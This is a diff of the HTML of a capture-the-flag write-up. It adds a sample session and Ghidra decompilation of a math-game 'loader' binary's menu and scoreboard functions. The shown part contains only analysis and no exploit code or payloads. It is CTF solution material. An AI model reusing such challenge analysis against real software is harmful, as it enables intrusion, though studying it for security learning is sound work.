@@ -87,13 +87,13 @@
           ·
         </span>
         <span>
-          6592 words
+          8572 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          31 minute read
+          41 minute read
         </span>
     </div>
 
@@ -110,7 +110,11 @@
 </blockquote>
 <p>I worked on this challenge together with my teammate <code>pivik</code>. Thanks a lot <code>pivik</code>!</p>
 <h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
-<p>We were given a lot of files, where one of it is the main binary called <code>loader</code>, and the rest are object files. Now, let&rsquo;s try to run the program first so that we can know how the program works.</p>
+<p><p class="markdown-image">
+  <img src="https://i.imgur.com/voaPMwJ.png" alt=""  />
+</p></p>
+<p>We were given a lot of files, where one of it is the main binary called <code>loader</code>, and the rest are object files.</p>
+<p>Now, let&rsquo;s try to run the program first so that we can know how the program works.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -147,6 +151,62 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> ./loader
@@ -168,14 +228,28 @@
 </span></span><span style="display:flex;"><span>Have Fun, Good Luck!
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Round 1
-</span></span><span style="display:flex;"><span>How much is 4 + 2 ?
-</span></span><span style="display:flex;"><span>6
+</span></span><span style="display:flex;"><span>How much is 0 + 3 ?
+</span></span><span style="display:flex;"><span>3
 </span></span><span style="display:flex;"><span>Yes! +5pts! You have 5pts total.
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Round 2
-</span></span><span style="display:flex;"><span>How much is 0 + 6 ?
-</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>[truncated]
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Round 11
+</span></span><span style="display:flex;"><span>How much is 3 + 7 ?
+</span></span><span style="display:flex;"><span>10
+</span></span><span style="display:flex;"><span>Yes! +5pts! You have 55pts total.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Round 12
+</span></span><span style="display:flex;"><span>How much is 2 + 9 ?
+</span></span><span style="display:flex;"><span>0 
 </span></span><span style="display:flex;"><span>Wrong! Game Over!
+</span></span><span style="display:flex;"><span>Congratulations! You&#39;re going to the SCOREBOARD!
+</span></span><span style="display:flex;"><span>How long is your name (0-31)?
+</span></span><span style="display:flex;"><span>8       
+</span></span><span style="display:flex;"><span>Now type in your name:
+</span></span><span style="display:flex;"><span>Chovid99
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>-=*) MAIN MENU:
 </span></span><span style="display:flex;"><span>  1) Play The Game
@@ -183,11 +257,184 @@
 </span></span><span style="display:flex;"><span>  3) See score for place
 </span></span><span style="display:flex;"><span>  4) Exit
 </span></span><span style="display:flex;"><span>Your choice?
+</span></span><span style="display:flex;"><span>Come again?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
+</span></span><span style="display:flex;"><span>  1) Play The Game
+</span></span><span style="display:flex;"><span>  2) See full scoreboard
+</span></span><span style="display:flex;"><span>  3) See score for place
+</span></span><span style="display:flex;"><span>  4) Exit
+</span></span><span style="display:flex;"><span>Your choice?
+</span></span><span style="display:flex;"><span>2
+</span></span><span style="display:flex;"><span>-=*) SCOREBOARD:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  0. 95pts --- Gary
+</span></span><span style="display:flex;"><span>  1. 90pts --- Yoel
+</span></span><span style="display:flex;"><span>  2. 85pts --- Nicholas
+</span></span><span style="display:flex;"><span>  3. 80pts --- Vanessa
+</span></span><span style="display:flex;"><span>  4. 75pts --- Alice
+</span></span><span style="display:flex;"><span>  5. 70pts --- Elizabeth
+</span></span><span style="display:flex;"><span>  6. 65pts --- Linda
+</span></span><span style="display:flex;"><span>  7. 60pts --- Peter
+</span></span><span style="display:flex;"><span>  8. 55pts --- Wayne
+</span></span><span style="display:flex;"><span>  9. 55pts --- Chovid99
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
+</span></span><span style="display:flex;"><span>  1) Play The Game
+</span></span><span style="display:flex;"><span>  2) See full scoreboard
+</span></span><span style="display:flex;"><span>  3) See score for place
+</span></span><span style="display:flex;"><span>  4) Exit
+</span></span><span style="display:flex;"><span>Your choice?
+</span></span><span style="display:flex;"><span>3
+</span></span><span style="display:flex;"><span>Which place&#39;s score do you want to see (0-9)?
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>To get this place you need to beat this score: 95
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
+</span></span><span style="display:flex;"><span>  1) Play The Game
+</span></span><span style="display:flex;"><span>  2) See full scoreboard
+</span></span><span style="display:flex;"><span>  3) See score for place
+</span></span><span style="display:flex;"><span>  4) Exit
+</span></span><span style="display:flex;"><span>Your choice?
+</span></span><span style="display:flex;"><span>4
+</span></span><span style="display:flex;"><span>Alright, bye
+</span></span><span style="display:flex;"><span>WINNER: Gary
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Ah okay. Looking around the given file, most of thhe game methods are defined under <code>game.o</code> file. So, let&rsquo;s try to take a look on the <code>game.o</code> file by decompiling it first to understand better. I will only show some important methods only that needs to be looked to solve this chall.</p>
+</div><p>Ah okay. Playing around the binary gave us enough knowledge on how the binary works. We have 4 menus that we can interact:</p>
+<ul>
+<li>First menu will start the math game
+<ul>
+<li>Each correct answer gave you <code>5 pts</code></li>
+<li>If your score is high enough to be placed in the scoreboard, they will ask your name and then store it to the scoreboard</li>
+</ul>
+</li>
+<li>Second menu will show the full scoreboard</li>
+<li>Third menu will show the score value of the <code>scoreboard[input_idx]</code></li>
+<li>Fourth menu will exit the game</li>
+</ul>
+<p>Now we&rsquo;ve got the idea on how the binary works, let&rsquo;s try analyzing all of the given files. I use <a href="https://github.com/NationalSecurityAgency/ghidra/releases" target="_blank" rel="noopener">Ghidra</a> to as my binary analyzer.</p>
 <h4 id="decompilation-of-gameo">Decompilation of <code>game.o</code> <a href="#decompilation-of-gameo" class="anchor">#</a></h4>
-<p>We start by decompiling of the <code>game.o</code> object. Let&rsquo;s try to check the first main menu decompiled result.</p>
+<p>Looking around the given file, turn out, most of the above game methods are defined under <code>game.o</code> file. So, let&rsquo;s try to analyze the <code>game.o</code> file decompiled result to understand better.</p>
+<p>We can start by checking the <code>menu</code> method, which checking the decompiled version is pretty similar with what we have interacted before.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">menu</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar1;
+</span></span><span style="display:flex;"><span>  byte bVar2;
+</span></span><span style="display:flex;"><span>  undefined8 uVar3;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  undefined local_38 [<span style="color:#f60">40</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  puts(
+</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">-=*) MAIN MENU:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  1) Play The Game</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  2) See full scoreboard</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  3) See score for place</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">   4) Exit</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Your choice?&#34;</span>
+</span></span><span style="display:flex;"><span>      );
+</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#555">=</span> readline(local_38,<span style="color:#f60">0x20</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">==</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
+</span></span><span style="display:flex;"><span>    bVar2 <span style="color:#555">=</span> atou64(local_38);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">4</span>) {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Alright, bye&#34;</span>);
+</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">3</span>) {
+</span></span><span style="display:flex;"><span>          see_scoreboard();
+</span></span><span style="display:flex;"><span>          uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>            game();
+</span></span><span style="display:flex;"><span>            uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
+</span></span><span style="display:flex;"><span>            see_full_scoreboard();
+</span></span><span style="display:flex;"><span>            uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Come again?&#34;</span>);
+</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_00100829</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">==</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> uVar3;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  __stack_chk_fail();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this <code>menu</code> method, we can see that for each menu that we chose before, they have their own method to handle the menu.</p>
+<p>Let&rsquo;s try to check the first main menu decompiled result, which defined under <code>game</code> method.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -306,7 +553,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>This is the method where we can play the math game that we try before. Reading through the source code, it will be on loop to give us question when we gave the correct answer. If we gave the wrong answer, it will break the loop and call <code>check_scoreboard</code>. Let&rsquo;s check it.</p>
+</div><p>Reading through the source code, it will be initialize a loop to give us questions. If we gave the correct answer to the question, it will stay in loop. It also has its own variable to store the points that we get from answering the questions (which is 5-pts per correct answer). If we gave the wrong answer, it will break the loop and call <code>check_scoreboard</code> with parameter our total score. Let&rsquo;s check what does the method do.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -367,7 +614,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Reading through the source code, we can see that in this method, if our score is higher than one of the value stored in the <code>game_scoreboard</code>, this method will call <code>shift_scoreboard</code> and <code>get_playername</code>. Let&rsquo;s try to decompile it</p>
+</div><p>Reading through the source code, we can see that in this method, if our score is higher than one of the value stored in the <code>game_scoreboard</code>, this method will call <code>shift_scoreboard</code> and <code>get_playername</code>. Let&rsquo;s try to decompile each of it to understand better.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -410,7 +657,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>This method doesn&rsquo;t have anything suspicious LOC, it just shifting the array in order to put our played score to the scoreboard array.</p>
+</div><p>This method doesn&rsquo;t have anything suspicious LOC, it just shifting the array in order to put our score to the scoreboard array.</p>
